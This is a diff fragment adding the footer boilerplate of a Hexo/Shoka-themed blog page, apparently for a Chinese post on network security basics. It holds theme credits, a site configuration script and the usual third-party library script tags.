+    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2021/08/08/base/网络安全知识嗷/',
+    favicon: {
+      show: "（●´3｀●）やれやれだぜ",
+      hide: "(´Д｀)大変だ！"
+    },
+    search : {
+      placeholder: "文章搜索",
+      empty: "关于 「 ${query} 」，什么也没搜到",
+      stats: "${time} ms 内找到 ${hits} 条结果"
+    },
+    valine: true,fancybox: true,copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
